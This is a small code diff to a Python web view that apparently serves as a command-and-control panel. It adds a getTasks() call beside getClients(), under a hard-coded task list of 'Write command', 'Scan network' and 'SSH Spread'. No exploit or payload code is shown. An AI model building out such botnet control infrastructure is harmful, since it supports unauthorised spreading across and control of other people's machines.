@@ -18,6 +18,7 @@ def index(request):
     """
     controlServer = ControlServerHandler()
     controlServer.getClients()
+    controlServer.getTasks()
     tasks = [{'name': "Write command"}, {'name': "Scan network"}, {'name': "SSH Spread"}]
 
     if request.method == 'POST':
